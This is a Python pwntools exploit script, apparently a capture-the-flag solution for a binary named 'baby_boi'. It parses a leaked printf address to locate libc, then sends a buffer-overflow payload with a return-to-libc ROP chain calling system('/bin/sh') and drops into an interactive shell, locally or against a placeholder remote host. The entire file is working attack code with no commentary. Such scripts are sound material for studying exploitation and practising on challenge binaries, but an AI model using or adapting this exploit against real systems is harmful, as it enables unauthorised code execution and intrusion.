#!/usr/bin/env python3

from pwn import *

exe = ELF("./baby_boi")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    gdb.attach(r)
    pause()
    r.recvuntil("Here I am: 0x")
    leak = int(r.recvn(12), 16)	

    libc.address = leak - libc.symbols["printf"]
    system = libc.symbols["system"]
    binsh = next(libc.search('/bin/sh\x00')) 
    pop_rdi = libc.address + 0x000000000002155f

    log.info("libc base address: {}".format(hex(libc.address)))
    log.info("system address: {}".format(hex(system)))
    log.info("binsh address: {}".format(hex(binsh)))
    
    r.sendline("A" * 0x20 + "B" * 8 + p64(pop_rdi) + p64(binsh) + p64(system))
    r.interactive()


if __name__ == "__main__":
    main()
